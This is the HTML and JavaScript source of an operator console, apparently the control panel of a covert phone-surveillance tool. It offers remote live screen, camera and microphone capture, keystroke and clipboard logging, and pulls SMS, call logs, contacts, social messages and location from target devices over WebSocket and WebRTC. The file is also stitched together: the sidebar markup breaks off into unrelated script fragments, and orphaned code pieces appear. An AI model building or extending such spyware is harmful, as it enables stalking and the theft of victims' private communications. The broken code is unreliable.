<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SystemSync Console · Remote Monitoring</title>
    
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    
    <style>
        :root {
            --primary: #0f62fe;
            --primary-hover: #0353e9;
            --bg-body: #f4f7fb;
            --bg-surface: #ffffff;
            --text-main: #12161b;
            --text-sec: #5c6a7a;
            --border: #e2e8f0;
            --danger: #e02424;
            --danger-bg: #fdf2f2;
            --success: #057a55;
            --success-bg: #f3faf7;
            --radius-sm: 8px;
            --radius-md: 12px;
            --radius-lg: 16px;
            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.08);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg-body); font-family: 'Inter', system-ui, sans-serif; display: flex; height: 100vh; overflow: hidden; color: var(--text-main); }
        button, input, select, textarea { font-family: inherit; }
        
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }

        /* Sidebar */
        #sidebar {
            width: 280px; background: rgba(255, 255, 255, 0.6); backdrop-filter: blur(16px); border-right: 1px solid rgba(255, 255, 255, 0.4);
            padding: 20px 16px; overflow-y: auto; flex-shrink: 0; box-shadow: 1px 0 10px rgba(0,0,0,0.02);
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1); z-index: 200;
        }
        .logo { font-size: 20px; font-weight: 700; color: var(--primary); margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; letter-spacing: -0.5px; }
        #sidebarCloseBtn { display: none; background: none; border: none; font-size: 20px; cursor: pointer; color: var(--text-sec); }
        .section { margin-bottom: 24px; }
        .section-title { font-size: 11px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 10px; letter-spacing: 0.5px; padding-left: 8px; }
        #sidebar button {
            width: 100%; padding: 10px 14px; margin: 2px 0; background: transparent;
            color: var(--text-main); border: none; border-radius: var(--radius-sm);
            font-size: 14px; font-weight: 500; text-align: left; cursor: pointer; transition: all 0.2s ease;
            display: flex; align-items: center; gap: 12px;
        }
        #sidebar button span:first-child { font-size: 16px; opacity: 0.8; }
        #sidebar button:hover { background: #f0f4f8; color: var(--primary); transform: translateX(2px); }

        .camera-panel { background: #f8fafc; border-radius: var(--radius-sm); padding: 16px; margin: 8px 0 16px; border: 1px solid var(--border); display: none; }
        .camera-panel.show { display: block; animation: slideDown 0.2s ease-out; }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
        .camera-option { margin: 8px 0; font-size: 13px; display: flex; gap: 12px; }
        .camera-option label { color: var(--text-main); display: flex; align-items: center; gap: 4px; cursor: pointer; }
        .capture-btn, .live-btn { background: var(--primary); color: white; border: none; padding: 10px; border-radius: var(--radius-sm); cursor: pointer; width: 100%; margin-top: 12px; font-weight: 600; transition: 0.2s; }
        .capture-btn:hover, .live-btn:hover { background: var(--primary-hover); box-shadow: 0 4px 10px rgba(15,98,254,0.2); }

        /* Main Content */
        #main { flex: 1; display: flex; flex-direction: column; min-width: 0; background: var(--bg-body); }
        #header {
            height: 64px; background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(16px); border-bottom: 1px solid rgba(255,255,255,0.4);
            display: flex; align-items: center; justify-content: space-between;
            padding: 0 24px; flex-shrink: 0; box-shadow: var(--shadow-sm); z-index: 10;
        }
        #menuBtn { display: none; background: #f1f5f9; border: none; border-radius: var(--radius-sm); padding: 8px; font-size: 18px; cursor: pointer; color: var(--text-main); transition: 0.2s; }
        #menuBtn:hover { background: #e2e8f0; }
        #headerTitle { font-size: 16px; font-weight: 600; color: var(--text-main); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        #serverInfo { font-weight: 400; color: var(--text-sec); font-size: 14px; margin-left: 8px; }
        
        #status { padding: 6px 16px; border-radius: 20px; background: #eff6ff; color: var(--primary); font-size: 13px; font-weight: 600; letter-spacing: 0.5px; display: inline-flex; align-items: center; gap: 6px; }
        #status::before { content: ''; width: 8px; height: 8px; border-radius: 50%; background: var(--primary); box-shadow: 0 0 6px var(--primary); }
        #status.offline { background: var(--danger-bg); color: var(--danger); }
        #status.offline::before { background: var(--danger); box-shadow: 0 0 6px var(--danger); }
        
        #reconnectBtn { background: var(--bg-surface); color: var(--text-sec); border: 1px solid var(--border); border-radius: 50%; width: 32px; height: 32px; font-size: 14px; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; transition: 0.2s; margin-left: 10px; }
        #reconnectBtn:hover { background: #f1f5f9; color: var(--text-main); transform: rotate(45deg); }
        
        #content { flex: 1; padding: 24px; overflow: auto; }
        #main-panel { background: var(--bg-surface); border-radius: var(--radius-md); padding: 32px; min-height: 100%; box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
        #main-panel h3 { font-size: 20px; font-weight: 600; margin-bottom: 20px; color: var(--text-main); }
        #main-panel p { color: var(--text-sec); margin-bottom: 20px; font-size: 14px; line-height: 1.6; }

        /* Tables */
        table { width: 100%; border-collapse: separate; border-spacing: 0; font-size: 14px; margin-top: 10px; border: 1px solid var(--border); border-radius: var(--radius-md); overflow: hidden; display: table; }
        th { background: #f8fafc; padding: 12px 16px; text-align: left; color: var(--text-sec); font-weight: 600; border-bottom: 1px solid var(--border); text-transform: uppercase; font-size: 12px; letter-spacing: 0.5px; }
        td { padding: 14px 16px; border-bottom: 1px solid #f1f5f9; color: var(--text-main); vertical-align: middle; }
        tr:last-child td { border-bottom: none; }
        tbody tr { transition: background 0.15s; }
        tbody tr:hover { background: #f8fafc; }
        
        .pagination { margin-top: 20px; display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; }
        .page-btn { padding: 6px 14px; border: 1px solid #cbd5e1; background: white; border-radius: var(--radius-sm); cursor: pointer; font-size: 13px; font-weight: 500; transition: 0.2s; }
        .page-btn:hover { border-color: var(--primary); color: var(--primary); }

        /* Auth & Device Modals - Premium Look */
        #authContainer, #deviceListContainer {
            position: fixed; inset: 0; background: rgba(244, 247, 251, 0.7); backdrop-filter: blur(12px);
            display: flex; justify-content: center; align-items: center; z-index: 20000;
        }
        #authBox, #deviceListBox {
            background: rgba(255, 255, 255, 0.9); padding: 40px; border-radius: var(--radius-lg);
            width: 400px; max-width: 90%; box-shadow: var(--shadow-lg); border: 1px solid rgba(255,255,255,0.4);
            animation: fadeInScale 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        @keyframes fadeInScale { from { opacity: 0; transform: translateY(20px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
        
        #authBox h2, #deviceListBox h2 { font-size: 24px; font-weight: 700; margin-bottom: 24px; text-align: center; color: var(--text-main); letter-spacing: -0.5px; }
        #authBox input { 
            width: 100%; padding: 14px 16px; margin: 8px 0; background: #f8fafc; border: 1px solid #cbd5e1; 
            border-radius: var(--radius-sm); font-size: 14px; outline: none; transition: 0.2s; 
        }
        #authBox input:focus { border-color: var(--primary); background: #fff; box-shadow: 0 0 0 4px rgba(15,98,254,0.1); }
        
        #authBox button, #logoutBtn { 
            width: 100%; padding: 14px; background: var(--primary); color: white; 
            border: none; border-radius: var(--radius-sm); cursor: pointer; 
            font-size: 15px; font-weight: 600; transition: all 0.2s; margin-top: 12px;
        }
        #authBox button:hover, #logoutBtn:hover { background: var(--primary-hover); transform: translateY(-1px); box-shadow: 0 4px 12px rgba(15,98,254,0.25); }
        #logoutBtn { background: #f1f5f9; color: var(--text-main); border: 1px solid #cbd5e1; margin-top: 24px; }
        #logoutBtn:hover { background: #e2e8f0; color: var(--danger); box-shadow: none; border-color: #cbd5e1; }
        
        .toggle-link {
            color: var(--text-sec); font-size: 14px; font-weight: 500; text-align: center; 
            margin-top: 24px; cursor: pointer; transition: 0.2s; text-decoration: none; display: block;
            background: #f1f5f9; padding: 12px; border-radius: var(--radius-sm);
        }
        .toggle-link:hover { color: var(--primary); background: #e2e8f0; transform: translateY(-1px); }
        
        .device-item { display: flex; align-items: center; padding: 16px; border: 1px solid var(--border); border-radius: var(--radius-md); margin-bottom: 12px; cursor: pointer; transition: 0.2s; background: var(--bg-surface); }
        .device-item:hover { transform: translateY(-2px); border-color: var(--primary); box-shadow: var(--shadow-md); }
        .device-info { flex: 1; margin-left: 16px; }
        .device-name { font-size: 16px; font-weight: 600; color: var(--text-main); margin-bottom: 4px; }
        .device-id { font-size: 13px; color: var(--text-sec); font-family: monospace; }
        .device-arrow { color: var(--primary); font-size: 20px; font-weight: bold; opacity: 0; transform: translateX(-10px); transition: 0.2s; }
        .device-item:hover .device-arrow { opacity: 1; transform: translateX(0); }

        /* File Manager Tree View */
        .file-toolbar-sticky { position: sticky; top: 0; background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(8px); z-index: 10; padding: 12px 0; border-bottom: 1px solid var(--border); display: flex; gap: 12px; margin-bottom: 16px; }
        .tree-root { list-style: none; padding-left: 0; }
        .tree-children { display: grid; grid-template-rows: 0fr; transition: grid-template-rows 0.3s ease-out; }
        .tree-children.expanded { grid-template-rows: 1fr; }
        .tree-children-inner { overflow: hidden; padding-left: 20px; list-style: none; border-left: 1px dashed var(--border); margin-left: 10px; padding-top: 4px; padding-bottom: 4px; }
        .folder-header, .file-row { display: flex; align-items: center; padding: 8px 12px; border-radius: var(--radius-sm); cursor: pointer; transition: 0.15s; border: 1px solid transparent; position: relative; }
        .folder-header:hover, .file-row:hover { background: #f8fafc; border-color: var(--border); }
        .folder-icon { font-size: 18px; margin-right: 12px; width: 24px; text-align: center; color: #fbbf24; }
        .file-icon { font-size: 18px; margin-right: 12px; width: 24px; text-align: center; color: #94a3b8; }
        .chevron { font-size: 12px; margin-right: 8px; transition: transform 0.3s; color: var(--text-sec); display: inline-block; width: 12px; }
        .chevron.down { transform: rotate(90deg); }
        .item-name { font-size: 14px; font-weight: 500; color: var(--text-main); flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; user-select: none; }
        .file-size { font-size: 12px; color: var(--text-sec); margin-left: 10px; }
        .file-actions { opacity: 0; transition: opacity 0.2s; margin-left: 16px; display: inline-flex; gap: 6px; }
        .file-row:hover .file-actions { opacity: 1; }
        .file-action-btn { background: #fff; border: 1px solid var(--border); border-radius: 4px; padding: 4px 8px; font-size: 12px; cursor: pointer; transition: 0.2s; display: inline-flex; align-items: center; }
        .file-action-btn:hover { background: #f1f5f9; box-shadow: var(--shadow-sm); }
        .file-action-btn.dl:hover { color: var(--primary); border-color: var(--primary); }
        .file-action-btn.del:hover { color: var(--danger); border-color: var(--danger); } height: 16px; margin-right: 14px; cursor: pointer; accent-color: var(--primary); }

        /* Map */
        #map, #historyMap { border-radius: var(--radius-md); box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
        .map-info { position: absolute; top: 20px; left: 20px; background: rgba(255,255,255,0.95); backdrop-filter: blur(8px); padding: 12px 16px; border-radius: var(--radius-sm); font-size: 13px; font-weight: 500; border-left: 4px solid var(--primary); z-index: 1000; box-shadow: var(--shadow-md); }
        .current-location-marker { background: #0f62fe; border-radius: 50%; width: 14px; height: 14px; border: 2px solid white; box-shadow: 0 0 0 4px rgba(15,98,254,0.3); }

        /* General buttons (Appended dynamically) */
        .btn-ui { padding: 8px 16px; font-size: 14px; font-weight: 500; border-radius: var(--radius-sm); cursor: pointer; transition: 0.2s; border: none; display: inline-flex; align-items: center; gap: 6px; }
        .btn-ui.primary { background: var(--primary); color: white; }
        .btn-ui.primary:hover { background: var(--primary-hover); box-shadow: 0 4px 10px rgba(15,98,254,0.2); transform: translateY(-1px); }
        .btn-ui.secondary { background: #f1f5f9; color: var(--text-main); border: 1px solid #cbd5e1; }
        .btn-ui.secondary:hover { background: #e2e8f0; }

        /* Badges */
        .badge { display: inline-block; padding: 4px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; background: #e2e8f0; color: #475569; }
        .badge.blue { background: #eff6ff; color: #1d4ed8; }

        /* Modals (Media) */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: center; z-index: 10000; animation: fadeIn 0.2s; }
        .modal-overlay.show { display: flex; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .mobile-popup { width: min(92vw, calc(92vh * 9 / 16)); height: min(92vh, calc(92vw * 16 / 9)); display: flex; flex-direction: column; background: #000; border-radius: var(--radius-lg); border: 1px solid #333; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
        .phone-frame { flex: 1; min-height: 0; background: black; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .phone-frame video { width: 100%; height: 100%; object-fit: contain; }
        .popup-controls { flex-shrink: 0; background: #111; padding: 16px; display: flex; gap: 12px; justify-content: center; }
        .popup-controls button { width: 48px; height: 48px; background: #222; color: white; border: none; border-radius: 50%; cursor: pointer; font-size: 20px; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
        .popup-controls button:hover { background: #333; transform: scale(1.05); }
        .popup-controls button.close-btn { background: var(--danger); }
        .popup-controls button.close-btn:hover { background: #b91c1c; }

        #downloadProgress { background: white; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 16px; margin: 0 24px 16px; display: none; box-shadow: var(--shadow-sm); }
        #progressBar { width: 0%; height: 8px; background: var(--primary); border-radius: 4px; transition: width 0.3s; }
        .app-usage-item { display: flex; align-items: center; padding: 14px; border-bottom: 1px solid #eef2f5; gap: 16px; }
        .app-usage-name { flex: 1; font-weight: 500; font-size: 14px; }
        .app-usage-time { width: 100px; text-align: right; color: var(--text-sec); font-size: 13px; font-family: monospace; }
        .usage-bar-container { flex: 2; height: 24px; background: #f1f5f9; border-radius: 12px; overflow: hidden; }
        .usage-bar { height: 100%; border-radius: 12px; transition: width 0.3s; display: flex; align-items: center; justify-content: flex-end; padding-right: 12px; color: white; font-size: 11px; font-weight: 600; }
        .event-card { background: white; border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 16px; margin-bottom: 12px; display: flex; align-items: center; gap: 16px; transition: 0.2s; }
        .event-card:hover { transform: translateY(-2px); box-shadow: var(--shadow-sm); }
        .event-icon { font-size: 32px; width: 48px; height: 48px; background: #f8fafc; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .event-details { flex: 1; }
        .event-title { font-weight: 600; font-size: 15px; color: var(--text-main); }
        .event-meta { font-size: 12px; color: var(--text-sec); margin-top: 6px; font-weight: 500; }
        .geofence-controls { margin-top: 16px; display: flex; gap: 12px; flex-wrap: wrap; }
        .geofence-controls button { padding: 10px 20px; color: white; border: none; border-radius: var(--radius-sm); cursor: pointer; width: auto; font-weight: 500; transition: 0.2s; }
        #alertsBadge { background: var(--danger-bg); border: 1px solid #fca5a5; border-radius: var(--radius-sm); padding: 16px; margin-top: 16px; }
        .ws-debug { font-size: 11px; color: #94a3b8; margin-top: auto; padding-top: 20px; text-align: center; }
        
        @media (max-width: 768px) {
            #sidebar { position: fixed; top: 0; left: 0; bottom: 0; transform: translateX(-100%); z-index: 1000; box-shadow: var(--shadow-lg); width: 280px; }
            #sidebar.open { transform: translateX(0); }
            #sidebarCloseBtn { display: flex; }
            #menuBtn { display: block; }
            #sidebarOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); z-index: 99; }
            #sidebarOverlay.show { display: block; }
            #serverInfo { display: none; }
            #content { padding: 16px; }
            #main-panel { padding: 20px; }
        }
    </style>
</head>
<body>

<div id="sidebarOverlay" onclick="closeSidebar()"></div>
<div id="authContainer"><div id="authBox"><h2 id="authModeTitle">🔐 SystemSync Login</h2><input type="email" id="authEmail" placeholder="Email Address" /><input type="password" id="authPassword" placeholder="Password" /><input type="password" id="authConfirmPassword" placeholder="Confirm Password" style="display:none;" /><button id="authBtn">Sign In</button><div class="toggle-link" id="toggleAuthMode">Don't have an account? Sign up</div><div id="authError"></div></div></div>
<div id="deviceListContainer" style="display:none;"><div id="deviceListBox"><h2>📱 Your Devices</h2><div id="deviceList" style="max-height: 400px; overflow-y: auto; padding-right: 4px; margin-bottom: 20px;"></div><button id="logoutBtn">Logout</button></div></div>

<div id="screenModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalScreenVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="modalSnapBtn">📸</button><button id="modalRecordBtn">🔴</button><button id="modalFullscreenBtn">⛶</button><button id="modalCloseBtn" class="close-btn">✕</button></div></div></div>
<div id="cameraModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><video id="modalCameraVideo" autoplay playsinline></video></div><div class="popup-controls"><button id="cameraSnapBtn">📸</button><button id="cameraRecordBtn">🔴</button><button id="cameraFullscreenBtn">⛶</button><button id="cameraCloseBtn" class="close-btn">✕</button></div></div></div>
<div id="audioModalOverlay" class="modal-overlay"><div class="mobile-popup"><div class="phone-frame"><audio id="modalAudioPlayer" controls style="width:100%;"></audio></div><div class="popup-controls"><button id="audioRecordBtn">🔴</button><button id="audioCloseBtn" class="close-btn">✕</button></div></div></div>

<div id="sidebar"><div class="logo">SystemSync 🔗<button id="sidebarCloseBtn" onclick="closeSidebar()">✕</button></div>
    <div class="section"><div class="section-title">Surveillance</div>
        <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
        <button id="clickPictureBtn"><span>📷</span> Click Picture</button>
        <div id="clickCameraPanel" class="camera-panel"><div class="camera-option"><label><input type="radio" name="clickCameraSelect" value="front" checked onchange="toggleFlashOptions()"> Front</label><label><input type="radio" name="clickCameraSelect" value="back" onchange="toggleFlashOptions()"> Rear</label></div><div class="camera-option" id="clickFlashContainer" style="display:none;"><label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label></div><button class="capture-btn" id="capturePictureBtn">TAKE PICTURE</button></div>
        <button id="liveCameraBtn"><span>📹</span> See Live</button>
        <div id="liveCameraPanel" class="camera-panel"><div class="camera-option"><label><input type="radio" name="liveCameraSelect" value="front" checked onchange="toggleFlashOptions()"> FrontCAM</label><label><input type="radio" name="liveCameraSelect" value="back" onchange="toggleFlashOptions()"> BackCAM</label></div><div class="camera-option"><label id="liveFlashContainer" style="display:none;"><input type="checkbox" id="liveFlashCheckbox"> Use flash</label><label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label></div><button class="live-btn" id="startLiveStreamBtn">Start Live</button></div>
        <button id="liveAudioBtn"><span>🎤</span> Live Audio</button>
        <button id="stopLiveAudioBtn" style="display:none;">⏹ Stop</button>

    </div>
    <div class="section"><div class="section-title">Data</div>
        <button id="fileManagerBtn"><span>📂</span> File Manager</button>
        <button id="smsBtn"><span>💬</span> SMS Messages</button>
        <button id="callLogsBtn"><span>📞</span> Call Logs</button>
        <button id="contactsBtn"><span>👥</span> Contacts</button>
        <button id="installedAppsBtn"><span>📱</span> Installed Apps</button>
        <button id="browserHistoryBtn"><span>🌐</span> Browser History</button>
        <button id="wifiNetworksBtn"><span>📶</span> Wi-Fi Networks</button>
    </div>
    <div class="section"><div class="section-title">Monitoring</div>
        <button id="screenTimeBtn"><span>📊</span> Screen Time</button>
        <button id="socialMessagesBtn"><span>💬</span> Social Messages</button>
        <button id="keylogBtn"><span>⌨️</span> Keyboard Log</button>
        <button id="clipboardBtn"><span>📋</span> Clipboard</button>
        <button id="geofenceBtn"><span>🗺️</span> Geofence</button>

function formatBytes(b) { if(b===0) return '0 B'; const i=Math.floor(Math.log(b)/Math.log(1024)); return (b/Math.pow(1024,i)).toFixed(1)+' '+['B','KB','MB','GB'][i]; }
function formatDuration(ms) { const h=Math.floor(ms/3600000); const m=Math.floor((ms%3600000)/60000); const s=Math.floor((ms%60000)/1000); return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`; }

// WEBSOCKET
function connectWebSocket(){
    if(ws&&(ws.readyState===WebSocket.OPEN||ws.readyState===WebSocket.CONNECTING))return;
    if(reconnectTimer)clearTimeout(reconnectTimer);
    setStatus('CONNECTING');
    if(wsDebug)wsDebug.innerText='🌐 WebSocket: connecting...';
    panel.innerHTML='⏳ Connecting to server...';
    ws=new WebSocket(CONFIG.WS_URL);
    ws.onopen=()=>{ reconnectAttempts=0; ws.send('I_AM_WEB'); setStatus('ONLINE'); panel.innerHTML='✅ Connected to server. Ready.'; if(wsDebug)wsDebug.innerText='🌐 WebSocket: ONLINE'; };
    ws.onmessage=e=>handleIncomingMessage(e.data);
    ws.onclose=()=>{ setStatus('OFFLINE'); if(wsDebug)wsDebug.innerText='🌐 WebSocket: closed'; panel.innerHTML='🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.'; ws=null; const d=Math.min(1000*Math.pow(1.5,reconnectAttempts),CONFIG.MAX_RECONNECT_DELAY); reconnectAttempts++; reconnectTimer=setTimeout(()=>connectWebSocket(),d); };
    ws.onerror=()=>{ setStatus('ERROR'); if(wsDebug)wsDebug.innerText='🌐 WebSocket: error'; };
}
function manualReconnect(){ if(reconnectTimer)clearTimeout(reconnectTimer); if(ws)ws.close(); reconnectAttempts=0; connectWebSocket(); }
function sendCommand(cmd,params={}){
    if(!ws||ws.readyState!==WebSocket.OPEN){panel.innerHTML='<div style="color:#d32f2f;">⚠ WebSocket not connected. <a href="#" onclick="manualReconnect()">Reconnect</a>.</div>';return;}
    const payload={type:'COMMAND',command:cmd,requestId:'req_'+Date.now()+'_'+Math.random().toString(36).substr(2,5),params,deviceId:selectedDeviceId,timestamp:Date.now()};
    ws.send(JSON.stringify(payload));
    panel.innerHTML=`<div style="color:#1976ff;">📤 Command sent: ${cmd}</div>`;
    pendingCommand=cmd;
    setTimeout(()=>{ if(pendingCommand===cmd)pendingCommand=null; },10000);
}
function sendPlainText(t){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(t); }

// WEBRTC
function createPeerConnection(type,onTrack,useMic){
    const pc=new RTCPeerConnection({iceServers:CONFIG.ICE_SERVERS});
    if(type==='screen') pc.addTransceiver('video',{direction:'recvonly'});
    else if(type==='camera'){ pc.addTransceiver('video',{direction:'recvonly'}); if(useMic)pc.addTransceiver('audio',{direction:'recvonly'}); }
    else if(type==='audio') pc.addTransceiver('audio',{direction:'recvonly'});
    pc.ontrack=onTrack;
    pc.onicecandidate=e=>{ if(e.candidate) sendSignaling({type:'ICE_CANDIDATE',candidate:e.candidate,streamType:type}); };
    return pc;
}
function sendSignaling(msg){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(JSON.stringify({type:'SIGNALING',deviceId:selectedDeviceId,data:msg})); }
function handleSignaling(msg){
    if(msg.type==='ANSWER'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc) pc.setRemoteDescription(new RTCSessionDescription({type:'answer',sdp:msg.sdp})); }
    else if(msg.type==='ICE_CANDIDATE'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc&&msg.candidate) pc.addIceCandidate(new RTCIceCandidate(msg.candidate)); }
}

        screenActive=true;
    }
}
document.getElementById('modalSnapBtn').onclick=()=>{ const v=document.getElementById('modalScreenVideo'); if(v&&v.videoWidth){ const c=document.createElement('canvas'); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); c.toBlob(b=>{ const a=document.createElement('a'); a.href=URL.createObjectURL(b); a.download=`screen_${Date.now()}.png`; a.click(); URL.revokeObjectURL(b); }); } };
document.getElementById('modalRecordBtn').onclick=()=>{ const v=document.getElementById('modalScreenVideo'); if(!v.srcObject)return; if(screenMediaRecorder&&screenMediaRecorder.state==='recording'){ screenMediaRecorder.stop(); document.getElementById('modalRecordBtn').innerText='🔴'; }else{ screenRecordedChunks=[]; const canvas=document.createElement('canvas'); const ctx=canvas.getContext('2d'); const draw=()=>{ if(v.videoWidth){ canvas.width=v.videoWidth; canvas.height=v.videoHeight; ctx.drawImage(v,0,0,canvas.width,canvas.height); } requestAnimationFrame(draw); }; draw(); const canvasStream=canvas.captureStream(30); v.srcObject.getAudioTracks().forEach(t=>canvasStream.addTrack(t)); screenMediaRecorder=new MediaRecorder(canvasStream); screenMediaRecorder.ondataavailable=e=>screenRecordedChunks.push(e.data); screenMediaRecorder.onstop=()=>{ const blob=new Blob(screenRecordedChunks,{type:'video/webm'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`screen_${Date.now()}.webm`; a.click(); URL.revokeObjectURL(blob); canvasStream.getTracks().forEach(t=>t.stop()); }; screenMediaRecorder.start(); document.getElementById('modalRecordBtn').innerText='🟢'; } };
document.getElementById('modalFullscreenBtn').onclick=()=>{ const v=document.getElementById('modalScreenVideo'); if(v.requestFullscreen)v.requestFullscreen(); };
document.getElementById('modalCloseBtn').onclick=()=>{ document.getElementById('screenModalOverlay').classList.remove('show'); document.body.classList.remove('modal-open'); if(screenMediaRecorder&&screenMediaRecorder.state==='recording')screenMediaRecorder.stop(); if(screenPC)screenPC.close(); screenPC=null; screenActive=false; document.getElementById('screenBtn').innerText='Start Screen'; };

// CAMERA MODAL with flash support
function showCameraModal(stream, cameraType){
    const modal=document.getElementById('cameraModalOverlay');
    const video=document.getElementById('modalCameraVideo');
    video.srcObject=stream;
    currentCameraStream=stream;
    modal.classList.add('show');
    document.body.classList.add('modal-open');
    let recording=false, recorder=null, chunks=[];
    document.getElementById('cameraSnapBtn').onclick=()=>{
        const canvas=document.createElement('canvas');
        canvas.width=video.videoWidth; canvas.height=video.videoHeight;
        canvas.getContext('2d').drawImage(video,0,0);
        canvas.toBlob(b=>{ const a=document.createElement('a'); a.href=URL.createObjectURL(b); a.download=`snapshot_${Date.now()}.png`; a.click(); URL.revokeObjectURL(b); });
    };
    document.getElementById('cameraRecordBtn').onclick=()=>{
        if(recording && recorder){ recorder.stop(); document.getElementById('cameraRecordBtn').innerText='🔴'; recording=false; }
        else{
            chunks=[]; const canvas=document.createElement('canvas'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
            const ctx=canvas.getContext('2d');
            const draw=()=>{ ctx.drawImage(video,0,0,canvas.width,canvas.height); requestAnimationFrame(draw); };
            draw();
            const canvasStream=canvas.captureStream(30);
            if(stream.getAudioTracks().length) stream.getAudioTracks().forEach(t=>canvasStream.addTrack(t));
            recorder=new MediaRecorder(canvasStream);
            recorder.ondataavailable=e=>chunks.push(e.data);
            recorder.onstop=()=>{ const blob=new Blob(chunks,{type:'video/webm'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`recording_${Date.now()}.webm`; a.click(); URL.revokeObjectURL(blob); canvasStream.getTracks().forEach(t=>t.stop()); };
            recorder.start(); recording=true; document.getElementById('cameraRecordBtn').innerText='🟢';
        }
    };
    document.getElementById('cameraFullscreenBtn').onclick=()=>{ if(video.requestFullscreen) video.requestFullscreen(); };
    document.getElementById('cameraCloseBtn').onclick=()=>{ 
        if(recorder&&recorder.state==='recording')recorder.stop(); 
        if(stream)stream.getTracks().forEach(t=>t.stop()); 
        modal.classList.remove('show'); 
        document.body.classList.remove('modal-open'); 
        if(cameraPC)cameraPC.close(); 
        cameraPC=null;
        // Turn off flash when stream stops
        if(cameraType === 'back') sendCommand('FLASH_OFF');
    };
}
async function startLiveCamera(){
    const camera=document.querySelector('input[name="liveCameraSelect"]:checked').value;
    const useFlash=document.getElementById('liveFlashCheckbox').checked;
    const useMic=document.getElementById('liveMicCheckbox').checked;
    
    // Turn on flash before starting stream if back camera and flash enabled
    if(useFlash && camera === 'back') {
        sendCommand('FLASH_ON');
    }
    
    cameraPC=createPeerConnection('camera',e=>showCameraModal(e.streams[0], camera),useMic);
    const offer=await cameraPC.createOffer(); await cameraPC.setLocalDescription(offer);
    sendSignaling({type:'OFFER',sdp:offer.sdp,streamType:'camera',camera,flash:useFlash,mic:useMic});
}
function stopLiveStream(){ 
    if(cameraPC)cameraPC.close(); 
    cameraPC=null; 
    sendSignaling({type:'STOP_CAMERA'}); 
    sendCommand('FLASH_OFF');
    panel.innerHTML='Ready.'; 
}

// FILE MANAGER
window.loadingFolderPath = null;

function renderFileTreeNodes(data, path) {
    const folders = data.filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
    const files = data.filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
    let html = '';
    folders.forEach(f=>{ 
        const encPath = btoa(encodeURIComponent(f.path)).replace(/=/g,'');
        html+=`<li>
            <div class="folder-header" onclick="handleFolderClick(this, '${escapeHtml(f.path)}')">
                <span class="chevron">▶</span><span class="folder-icon">📁</span>
                <span class="item-name">${escapeHtml(f.name)}</span>
            </div>
            <div class="tree-children" id="tree-container-${encPath}">
                <ul class="tree-children-inner" id="tree-inner-${encPath}"></ul>
            </div>
        </li>`; 
    });
    files.forEach(f=>{ 
        html+=`<li>
